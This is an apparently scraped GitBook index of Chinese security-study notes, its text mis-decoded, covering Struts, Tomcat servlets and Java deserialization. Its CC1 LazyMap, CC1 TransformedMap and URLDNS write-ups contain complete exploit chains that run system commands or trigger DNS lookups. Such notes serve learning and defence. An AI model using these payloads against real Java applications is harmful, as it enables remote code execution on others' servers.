å‰ï¼Œä¼šä¾æ¬¡è°ƒç”¨æ‰€æœ‰é…ç½®çš„æ‹¦æˆªå™¨ï¼ˆIntercepter1ã€Intercepter2â€¦â€¦ï¼‰ã€‚ 7ï¼‰ä¸€æ—¦ Action æ‰§è¡Œå®Œï¼Œåˆ™è¿”å›ç»“æœå­—ç¬¦ä¸²ï¼ŒActionInvocation å°±ä¼šè´Ÿè´£æŸ¥æ‰¾ç»“æœå­—ç¬¦ä¸²å¯¹åº”çš„ Resultï¼Œç„¶åæ‰§è¡Œè¿™ä¸ª Resultã€‚é€šå¸¸æƒ…å†µä¸‹ Result ä¼šè°ƒç”¨ä¸€äº›æ¨¡æ¿ï¼ˆJSP ç­‰ï¼‰å‘ˆç°é¡µé¢ã€‚ 8ï¼‰äº§ç”Ÿçš„ Result ä¿¡æ¯è¿”å›ç»™ ActionInvocationï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ‹¦æˆªå™¨ä¼šè¢«å†æ¬¡æ‰§è¡Œï¼ˆé¡ºåºä¸ Action æ‰§è¡Œä¹‹å‰ç›¸åï¼‰ã€‚ 9ï¼‰æœ€åäº§ç”Ÿä¸€ä¸ª HttpServletResponse çš„å“åº”è¡Œä¸ºï¼Œé€šè¿‡ StrutsPrepareAndExecuteFilter åé¦ˆç»™å®¢æˆ·ç«¯ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 16:26:16 "},"03.ä»£ç å®¡è®¡/JAVA/03.JavaWebäº†è§£/Tomcat.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/03.JavaWebäº†è§£/Tomcat.html","title":"Tomcat","keywords":"","body":"Servlet Tomcat JSP Tomcat: æ˜¯Servletçš„å®¹å™¨,Servletè¿è¡Œåœ¨Tomcatå®¹å™¨å½“ä¸­,Servletå®¹å™¨æœ‰å¾ˆå¤š(tomcat,Jboss,jetty)ç­‰ JSP: å…¨ç§°Java Server Pagesï¼Œæ˜¯ä¸€ç§åŠ¨æ€ç½‘é¡µå¼€å‘æŠ€æœ¯ã€‚å®ƒä½¿ç”¨JSPæ ‡ç­¾åœ¨HTMLç½‘é¡µä¸­æ’å…¥Javaä»£ç ã€‚æ ‡ç­¾é€šå¸¸ä»¥ç»“æŸã€‚ Serlvet: å…¨ç§°Java Servlet,æ˜¯ç”¨Javaç¼–å†™çš„æœåŠ¡å™¨ç«¯ç¨‹åºã€‚Servletåªæ˜¯ä¸€ä¸ªJavaç±»ï¼Œå°±åƒæ§åˆ¶å™¨ç±»ä¸€æ ·ï¼Œæ¥æ”¶å‰ç«¯ä¼ è¿‡æ¥çš„æ•°æ®ï¼Œç„¶åè¿›è¡Œå¤„ç†ã€‚ å®šä¹‰ä¸€ä¸ª Servlet å¾ˆç®€å•ï¼Œåªéœ€è¦ç»§æ‰¿javax.servlet.http.HttpServletç±»å¹¶é‡å†™doXXX(å¦‚doGetã€doPost)æ–¹æ³•æˆ–è€…serviceæ–¹æ³•å°±å¯ä»¥äº† åŸºäºWeb.xmlé…ç½®--Servlet é¡µé¢å’Œç±»æ˜¯æ¯«æ— å…³è”çš„ï¼Œéœ€è¦åœ¨web.xmlé‡Œé¢åˆ›å»ºUrlä¸Servletä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œ/loginç”±FirstServletæ¥è¿›è¡Œå¤„ç† ç®€å•å®ç°ç”¨æˆ·ç™»å½•åˆ¤æ–­ FirstServelt import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; public class FirstServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String name = request.getParameter(\"name\"); String password = request.getParameter(\"password\"); String html = null; if (\"admin\".equals(name) && \"123\".equals(password)) html = \"success\"; else html = \"fail\"; PrintWriter pw = response.getWriter(); pw.println(html); } } index.jsp $Title$ è´¦å·: å¯†ç : è¯·æ±‚çš„å¤„ç†æµç¨‹ï¼šå‰ç«¯è®¿é—®actionï¼Œç„¶ååœ¨web.xmlä¼šæ ¹æ®åŒåçš„url-patternå»è®¿é—®å¯¹åº”çš„servletç±»ï¼Œservletç±»é‡Œé¢åšå®Œç›¸åº”çš„å¤„ç†åï¼Œå†è¿”å›å†…å®¹åˆ°é¡µé¢ä¸Š åŸºäºæ³¨è§£--Servlet>=3.0 @WebServlet(name = \"FirstServlet\", urlPatterns = {\"/login\"}) import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @WebServlet(name = \"FirstServlet\", urlPatterns = {\"/login\"}) public class FirstServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String name = request.getParameter(\"name\"); String password = request.getParameter(\"password\"); String html = null; if (\"admin\".equals(name) && \"123\".equals(password)) html = \"success\"; else html = \"fail\"; PrintWriter pw = response.getWriter(); pw.println(html); } } Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 16:00:26 "},"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/CCé“¾/CC1--LazyMap.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/CCé“¾/CC1--LazyMap.html","title":"JAVAååºåˆ—åŒ–ä¹‹CC1--LazyMap","keywords":"","body":"CC1--lazyMap chains ysoserialä¸­cc1é“¾ä½¿ç”¨çš„æ˜¯LazyMap å‰ç½®çŸ¥è¯†javaä»£ç† https://y4er.com/posts/java-proxy/ å…³é”®ç‚¹ è¢«åŠ¨æ€ä»£ç†çš„å¯¹è±¡è°ƒç”¨ä»»æ„æ–¹æ³•éƒ½ä¼šé€šè¿‡å¯¹åº”çš„InvocationHandlerçš„invokeæ–¹æ³•è§¦å‘ åˆ†æ å±é™©æ–¹æ³•æ˜¯InvokerTransformer.transform()ï¼Œä¹‹å‰ä½¿ç”¨çš„æ˜¯ TransformedMap ä¸‹çš„ checkSetValue æ–¹æ³•æ¥è°ƒç”¨ï¼Œè¿™æ¬¡ç”¨LazyMap ä¸‹çš„ get æ–¹æ³•è°ƒç”¨ factory.transform getæ–¹æ³• è°è°ƒç”¨äº†getæ–¹æ³• å¯ä»¥çœ‹åˆ°æ˜¯sun.reflect.annotation.AnnotationInvocationHandler ä¸­çš„invokeæ–¹æ³•ï¼Œç»“åˆåŠ¨æ€ä»£ç†å¯ä»¥çŸ¥é“invoke æ–¹æ³•åœ¨å¯¹è±¡ä»£ç†æ—¶ä¼šè¢«è§¦å‘ã€‚è€Œå®é™…ä¸Šè¿™ä¸ªç±»å®é™…å°±æ˜¯ä¸€ä¸ªInvocationHandlerï¼Œæˆ‘ä»¬å¦‚æœå°†è¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆåœ¨readObjectçš„æ—¶å€™ï¼Œåªè¦è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥åˆ°AnnotationInvocationHandler#invokeæ–¹æ³•ä¸­ï¼Œè¿›è€Œè§¦å‘æˆ‘ä»¬çš„LazyMap#getã€‚ // æ„å»ºå¯¹è±¡ Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // åˆ›å»ºLazyMapçš„handlerå®ä¾‹ InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap); // åˆ›å»ºLazyMapçš„åŠ¨æ€ä»£ç†å®ä¾‹ Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // åŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œæ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œéƒ½ä¼šåˆ°invokeä¸­å» ä»£ç†åçš„å¯¹è±¡å«åšproxyMapï¼Œä½†æˆ‘ä»¬ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºæˆ‘ä»¬å…¥å£ç‚¹æ˜¯ sun.reflect.annotation.AnnotationInvocationHandler#readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†ç”¨AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapè¿›è¡ŒåŒ…è£¹ï¼ˆæˆ‘ä»¬éœ€è¦çš„æ˜¯AnnotationInvocationHandlerè¿™ä¸ªç±»çš„å¯¹è±¡ï¼‰ // åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerå®ä¾‹ï¼Œå¹¶ä¸”æŠŠåˆšåˆšåˆ›å»ºçš„ä»£ç†èµ‹å€¼ç»™this.memberValues handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); å®Œæ•´poc public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class}, new Object[]{\"getRuntime\",new Class[0]}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),}; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); // æ„å»ºå¯¹è±¡ Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // åˆ›å»ºLazyMapçš„handlerå®ä¾‹ InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); // åˆ›å»ºLazyMapçš„åŠ¨æ€ä»£ç†å®ä¾‹ Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerå®ä¾‹ï¼Œå¹¶ä¸”æŠŠåˆšåˆšåˆ›å»ºçš„ä»£ç†èµ‹å€¼ç»™this.memberValues handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); serialize(handler); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:12:29 "},"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/CCé“¾/CC1-TransFormed.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/CCé“¾/CC1-TransFormed.html","title":"Javaååºåˆ—åŒ–ä¹‹CC1-TransFormed","keywords":"","body":"CC1-TransFormed chains ç¯å¢ƒ java commons-collections commons-collections 3.1 å¤ç° Demo å…³é”®ç‚¹ # èƒ½å¤Ÿä»»æ„å‘½ä»¤æ‰§è¡Œçš„ç‚¹ InvokerTransformeræ˜¯å®ç°äº†Transformeræ¥â¼çš„â¼€ä¸ªç±»ï¼Œè¿™ä¸ªç±»ä½¿ç”¨äº†åå°„ï¼Œå¹¶ä¸”åå°„çš„å‚æ•°å¯æ§ï¼Œå¯ä»¥â½¤æ¥æ‰§â¾ä»»æ„â½…æ³•ã€‚ # æ‰‹åŠ¨è°ƒç”¨InvokerTransformerçš„transfromæ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ Runtime runtime = Runtime.getRuntime(); new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(runtime); Demoä»£ç è§£é‡Š æ„é€ å›è°ƒé“¾ Transformer[] transformers = new Transformer[]{ //ç›´æ¥è¿”å›å½“å‰ç¯å¢ƒçš„Runtimeå¯¹è±¡ new ConstantTransformer(Runtime.getRuntime()), //ç¬¬â¼€ä¸ªå‚æ•°æ˜¯å¾…æ‰§â¾çš„â½…æ³•åï¼ˆå“ªä¸ªç±»çš„æ–¹æ³•åï¼Ÿå‰ä¸€ä¸ªå›è°ƒå‡½æ•°è¿”å›çš„ç»“æœå³ConstantTransformerè¿”å›çš„å¯¹è±¡ï¼‰ //ç¬¬â¼†ä¸ªå‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹ //ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨ new InvokerTransformer( \"exec\", new Class[]{String.class}, new Object[]{\"calc\"} ), }; //å°†å†…éƒ¨çš„å¤šä¸ªTransformerä¸²åœ¨â¼€èµ·ï¼Œå‰â¼€ä¸ªå›è°ƒè¿”å›çš„ç»“æœï¼Œä½œä¸ºåâ¼€ä¸ªå›è°ƒçš„å‚æ•°ä¼ â¼Š Transformer transformerChain = new ChainedTransformer(transformers); ä¿®é¥°Map TransformedMapâ½¤äºå¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapåšâ¼€ä¸ªä¿®é¥°ï¼Œè¢«ä¿®é¥°è¿‡çš„Mapåœ¨æ·»åŠ æ–°çš„å…ƒç´ æ—¶ï¼Œå°†å¯ä»¥æ‰§â¾â¼€ä¸ªå›è°ƒã€‚ //ä¿®é¥°Map Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate( innerMap, null, transformerChain ); è§¦å‘å›è°ƒæœ€åæ‰§è¡ŒRuntimeå¯¹è±¡çš„execæ–¹æ³• //è§¦å‘å›è°ƒ outerMap.put(\"test\", \"xxxx\"); POC é€šè¿‡ä¸Šé¢çš„Demoæˆ‘ä»¬å¯çŸ¥é“¾å­çš„å°¾å·´åœ¨InvokerTransformerçš„transfromæ–¹æ³•,å¾€å›æ‰¾ æŸ¥çœ‹ TranformedMap çš„æ„é€ æ–¹æ³•ï¼Œå› ä¸ºæ˜¯ protected å±æ€§æ— æ³•è°ƒç”¨ï¼Œå¯»æ‰¾åˆ°ä¸€ä¸ªé™æ€æ–¹æ³•è°ƒç”¨äº†æ„é€ æ–¹æ³• Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map = new HashMap<>(); //ä½¿ç”¨é™æ€æ–¹æ³•decorateæ¥è°ƒç”¨æ„é€ å‡½æ•° TransformedMap.decorate(map, null, invokerTransformer); æ‰¾è°è°ƒç”¨äº†checkSetValue MapEntryçš„setValueæ˜¯ç”¨äºéå†HashMapçš„ã€‚æ‰€ä»¥åªéœ€è¦éå†ä¸€ä¸ªMapå°±å¯ä»¥è§¦å‘è¿™ä¸ªsetValueæ–¹æ³•ã€‚ Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map = new HashMap<>(); map.put(\"test\",\"123\"); Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer); for (Map.Entry entry: transformedMap.entrySet()) { // è°ƒç”¨ SetValueï¼ŒSetValue ä¸­è°ƒç”¨äº† checkSetValueï¼ŒcheckSetValue è°ƒç”¨äº† transform entry.setValue(runtime); } ç»§ç»­æ‰¾è°è°ƒç”¨äº†setValueï¼Œè¿™é‡Œåˆšå¥½æœ‰ä¸€ä¸ªåœ¨readObjecté‡Œè°ƒç”¨äº†setValueçš„ å¹¶ä¸”ä»è¯¥ç±»çš„æ„é€ å‡½æ•°å¯ä»¥çŸ¥é“memberValuesæ˜¯å¯æ§çš„ Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map = new HashMap<>(); map.put(\"test\",\"123\"); Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer); // for (Map.Entry entry: transformedMap.entrySet()) { // // è°ƒç”¨ SetValueï¼ŒSetValue ä¸­è°ƒç”¨äº† checkSetValueï¼ŒcheckSetValue è°ƒç”¨äº† transform // entry.setValue(runtime); // } //ç±»æ²¡æœ‰æ³¨æ˜ç±»å‹ï¼Œé»˜è®¤ä¸º defaultï¼Œå³åªèƒ½åœ¨æœ¬åŒ…å†…ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦ç”¨åå°„è°ƒç”¨æ‰§è¡Œ Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationdhlConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationdhlConstructor.setAccessible(true); Object o = annotationInvocationdhlConstructor.newInstance(Override.class, transformedMap); ç°åœ¨æœ‰ä¸¤ä¸ªé—®é¢˜ Runtime ç±»ä¸å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œæ²¡æœ‰ç»§æ‰¿ serializable æ¥å£ï¼Œåå°„è·å–å¹¶è½¬æ¢ä¸ºTransformerå†™æ³• ```java //é¦–å…ˆéœ€è¦è·å¾—Runtimeç±»çš„Classå®ä¾‹ Class clz = Class.forName(\"java.lang.Runtime\"); //è·å¾—Runtimeç±»çš„getRuntimeæ–¹æ³• Method getruntime = clz.getMethod(\"getRuntime\"); //è°ƒç”¨è¯¥æ–¹æ³•è·å¾—Runtimeå¯¹è±¡ Object runtime = getruntime.invoke(clz); //è·å¾—Runtimeç±»çš„execæ–¹æ³• Method exec = clz.getMethod(\"exec\",String.class); //è°ƒç”¨execæ–¹æ³•æ‰§è¡Œå‘½ä»¤ exec.invoke(runtime,\"calc\"); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); 2. ifæ¡ä»¶ > è¿™éƒ¨åˆ†æ˜¯æ³¨è§£çš„çŸ¥è¯† ![image-20230923190120874](../images/image-20230923190120874.png) > 1. sun.reflect.annotation.AnnotationInvocationHandler æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ Annotationçš„å­ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•,æ–¹æ³•åä¸ºvalue > > ```java > Object o = annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap); > > è¢« TransformedMap.decorate ä¿®é¥°çš„Mapä¸­å¿…é¡»æœ‰ä¸€ä¸ªé”®åä¸ºvalueçš„å…ƒç´  map.put(\"value\",\"xxx\"); ç±»ä¸å¯æ§ éœ€è¦æ§åˆ¶setvalueçš„å‚æ•°ä¸ºRuntimeå¯¹è±¡ new ConstantTransformer(Runtime.class) //è¾“å…¥å•¥å¯¹è±¡è¿”å›å•¥å¯¹è±¡ æœ€ç»ˆpayload public class CommonCollections1POC { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); HashMap map = new HashMap<>(); map.put(\"value\",\"123\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); // æ‰‹åŠ¨è§¦å‘setvalue // for (Map.Entry entry: transformedMap.entrySet()) { // // è°ƒç”¨ SetValueï¼ŒSetValue ä¸­è°ƒç”¨äº† checkSetValueï¼ŒcheckSetValue è°ƒç”¨äº† transform // entry.setValue(runtime); // } //ç±»æ²¡æœ‰æ³¨æ˜ç±»å‹ï¼Œé»˜è®¤ä¸º defaultï¼Œå³åªèƒ½åœ¨æœ¬åŒ…å†…ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦ç”¨åå°„è°ƒç”¨æ‰§è¡Œ Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationdhlConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationdhlConstructor.setAccessible(true); // Target æ³¨è§£ç±»å‹ Object o = annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } æ€»ç»“ æˆ‘ä»¬æ„é€ æ¶æ„çš„AnnotationInvocationHandlerç±»ï¼Œå°†è¯¥ç±»çš„æˆå‘˜å˜é‡memberValuesèµ‹å€¼ä¸ºæˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„TransformedMapå¯¹è±¡ï¼Œå¹¶å°†AnnotationInvocationHandlerç±»è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åäº¤ç»™ç›®æ ‡JAVA WEBåº”ç”¨è¿›è¡Œååºåˆ—åŒ–ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¼šæ‰§è¡ŒreadObject()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šå¯¹æˆå‘˜å˜é‡TransformedMapçš„Valueå€¼è¿›è¡Œä¿®æ”¹ï¼Œè¯¥ä¿®æ”¹è§¦å‘äº†TransformedMapå®ä¾‹åŒ–æ—¶ä¼ å…¥çš„å‚æ•°InvokerTransformerçš„transform()æ–¹æ³•ï¼ŒInvokerTransformer.transform()æ–¹æ³•é€šè¿‡åå°„é“¾è°ƒç”¨Runtime.getRuntime.exec(â€œxxâ€)å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ä¸è¦æ‰¾åŒåå‡½æ•°è°ƒç”¨é™·å…¥å¾ªç¯ å¦‚æœç±»æ²¡æœ‰æ³¨æ˜ç±»å‹ï¼Œé»˜è®¤ä¸º defaultï¼Œå³åªèƒ½åœ¨æœ¬åŒ…å†…ä½¿ç”¨ï¼Œéœ€è¦ç”¨åå°„è°ƒç”¨æ‰§è¡Œ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:12:33 "},"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/CCé“¾/URLDNSé“¾.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/CCé“¾/URLDNSé“¾.html","title":"Javaååºåˆ—åŒ–ä¹‹URLDNS","keywords":"","body":"IDEA IDEAä¸­çš„debugæ–­ç‚¹è°ƒè¯•æŠ€å·§ï¼Œå­¦ä¼šçœŸçš„é¦™ï¼ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (72æ¡æ¶ˆæ¯) IntelliJ IDEAåˆ›å»ºServletæœ€æ–°æ–¹æ³• Ideaç‰ˆæœ¬2020.2.2ä»¥åŠIntelliJ IDEAåˆ›å»ºServlet 404é—®é¢˜ï¼ˆè¶…è¯¦ç»†ï¼‰_ideaåˆ›å»ºservleté¡¹ç›®_Granger_gçš„åšå®¢-CSDNåšå®¢ ysoserial è°ƒè¯• ä¸‹è½½æºç ï¼Œç­‰å¾…mavenå¯¼å…¥ä¾èµ–ï¼Œå†é…ç½®å¦‚ä¸‹å³å¯ï¼ˆjavaç‰ˆæœ¬ä¸ºjava8ï¼‰ ååºåˆ—åŒ– åŸºç¡€ â€‹ åœ¨javaä¸­ï¼Œå¦‚æœè¦å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡çš„ç±»å¿…é¡»è¦å®ç°java.io.Serializableæ¥å£ã€‚ å‡½æ•° åºåˆ—åŒ–writeObject ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); ååºåˆ—åŒ–readObject ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶å„ä»£ç å—çš„æ‰§è¡Œé¡ºåº static {} â†’ {} â†’ æ„é€ å‡½æ•° serialVersionUID ååºåˆ—æ—¶, å¦‚æœå­—èŠ‚æµä¸­çš„serialVersionUIDä¸ç›®æ ‡æœåŠ¡å™¨å¯¹åº”ç±»ä¸­çš„serialVersionUIDä¸åŒæ—¶å°±ä¼šå‡ºç°å¼‚å¸¸ï¼Œé€ æˆååºåˆ—åŒ–å¤±è´¥ã€‚ SUIDä¸åŒæ˜¯jaråŒ…ç‰ˆæœ¬ä¸åŒæ‰€é€ æˆï¼Œä¸åŒç‰ˆæœ¬jaråŒ…å¯èƒ½å­˜åœ¨ä¸åŒçš„è®¡ç®—æ–¹å¼å¯¼è‡´ç®—å‡ºçš„SUIDä¸åŒï¼Œè¿™ç§æƒ…å†µä¸‹åªéœ€è¦åŸºäºç›®æ ‡ä¸€æ ·çš„jaråŒ…ç‰ˆæœ¬å»ç”Ÿæˆpayloadå³å¯è§£å†³å¼‚å¸¸ï¼Œè¿›è€Œæå‡ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æˆåŠŸç‡ã€‚ ååºåˆ—åŒ–æ•°æ®æ ‡å¿— AC ED 00 05 URLDNSé“¾ åˆ†æçš„æ—¶å€™å‘ç°éœ€è¦æ³¨é‡Šæ‰ysoserialé‡å†™çš„ ysoserialä¸ºäº†é˜²â½Œåœ¨â½£æˆPayloadçš„æ—¶å€™ä¹Ÿæ‰§â¾äº†URLè¯·æ±‚å’ŒDNSæŸ¥è¯¢ï¼Œæ‰€ä»¥é‡å†™äº†â¼€ ä¸ª SilentURLStreamHandler ç±»ã€‚ åˆ†æè¿‡ç¨‹ å¦‚ä½•å¯»æ‰¾å¯èƒ½å…·æœ‰ååºåˆ—åŒ–æ¼æ´çš„ç±»ï¼Ÿ è¦æœ‰readObjectæ–¹æ³•ï¼Œæ‰€ä»¥ç›´å¥”HashMapçš„readObjectæ–¹æ³• putVal(hash(key), key, value, false, false); åœ¨ysoserialä¸­æ‰“ä¸‹æ–­ç‚¹ è·Ÿè¿›put è·Ÿè¿›hash è·Ÿè¿›hashCode è·Ÿè¿›handler.hashCode è·Ÿè¿›getHostAddress è¿™é‡Œå¤šäº†ä¸€æ­¥ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬é—®é¢˜å§ï¼Ÿ è¿™â¾¥ InetAddress.getByName(host) çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨ç½‘ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNSæŸ¥è¯¢ã€‚ Gadget Chain HashMap.readObject() HashMap.hash() URL.hashCode()ï¼šField hashCode=-1 URLStreamHandler->hashCode() URLStreamHandler->getHostAddress() URL->getHostAddress() InetAddress->getByName() éœ€è¦å®ä¾‹åŒ–ä¸‰ä¸ªç±» HashMap URLStreamHandler æ— å‚æ„é€ ï¼Œç›´æ¥new URL payload import java.io.*; import java.lang.reflect.Field; import java.net.*; import java.util.HashMap; public class URLDNSTestDemo implements Serializable { public static void main(String[] args) throws MalformedURLException, NoSuchFieldException, IllegalAccessException { HashMap hm = new HashMap(); URLStreamHandler handler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } }; String url = \"http://123.1020fd40.ipv6.1433.eu.org\"; URL u = new URL(null, url, handler); // é€šè¿‡åå°„ä¿®æ”¹ç§æœ‰å±æ€§hashCodeä¸º-1 Class clazz = u.getClass(); Field field = clazz.getDeclaredField(\"hashCode\"); field.setAccessible(true); field.set(u, -1); hm.put(u, url); } } Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:12:31 "},"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/FastJson.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/FastJson.html","title":"Fastjsonæ¼æ´","keywords":"","body":"FastJsonæ˜¯ä»€ä¹ˆ Fastjsonæ˜¯é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€æ¬¾jsonè§£æå™¨ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚ FastJsonååºåˆ—åŒ–æ¼æ´ åŸç† 